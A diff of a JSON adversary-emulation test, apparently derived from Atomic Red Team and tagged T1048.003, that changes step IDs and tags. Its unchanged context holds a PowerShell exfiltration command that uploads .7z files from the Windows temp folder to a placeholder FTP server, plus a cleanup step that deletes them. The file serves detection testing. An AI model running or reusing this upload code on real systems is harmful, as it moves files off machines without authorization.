@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "48caecd6-3e29-4f8f-996b-5fa3189ec5fe",
+      "id": "2225ff2f-1708-4430-9972-e51007df5815",
       "type": "execute-command",
       "data": {
         "command": "$Dir_to_copy = \"$env:windir\\temp\"\n$ftp = \"ftp://#{ftp_server}/\"\n$web_client = New-Object System.Net.WebClient\n$web_client.Credentials = New-Object System.Net.NetworkCredential('#{username}', '#{password}')\nif (test-connection -count 1 -computername \"#{ftp_server}\" -quiet)\n{foreach($file in (dir $Dir_to_copy \"*.7z\"))\n{echo \"Uploading $file...\"\n$uri = New-Object System.Uri($ftp+$file.name)\n$web_client.UploadFile($uri, $file.FullName)}}\nelse\n{echo \"FTP Server Unreachable. Please verify the server address in input args and try again.\"}\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "a5488fa3-b7a3-4a8d-9954-8cc42048fefd",
+      "id": "641cdb17-f132-4263-a193-420be3f80c31",
       "type": "execute-command",
       "data": {
         "command": "$ftp = \"ftp://#{ftp_server}/\"\ntry {foreach ($file in (dir \"$env:windir\\temp\" \"*.7z\"))\n{$uri = New-Object System.Uri($ftp+$file.name)\n $ftp_del = [System.Net.FtpWebRequest]::create($uri)\n $ftp_del.Credentials = New-Object System.Net.NetworkCredential('#{username}','#{password}')\n $ftp_del.Method = [System.Net.WebRequestMethods+Ftp]::DeleteFile\n $ftp_del.GetResponse()}} catch{}\n",
@@ -27,19 +27,19 @@
   ],
   "flows": [
     {
-      "s": "48caecd6-3e29-4f8f-996b-5fa3189ec5fe",
+      "s": "2225ff2f-1708-4430-9972-e51007df5815",
       "p": "on-success",
-      "o": "a5488fa3-b7a3-4a8d-9954-8cc42048fefd"
+      "o": "641cdb17-f132-4263-a193-420be3f80c31"
     },
     {
-      "s": "48caecd6-3e29-4f8f-996b-5fa3189ec5fe",
+      "s": "2225ff2f-1708-4430-9972-e51007df5815",
       "p": "on-failure",
-      "o": "a5488fa3-b7a3-4a8d-9954-8cc42048fefd"
+      "o": "641cdb17-f132-4263-a193-420be3f80c31"
     }
   ],
   "tags": [
-    "T1048.003",
-    "atomic-red-team"
+    "T1048",
+    "T1048.003"
   ],
   "input_arguments": [
     {
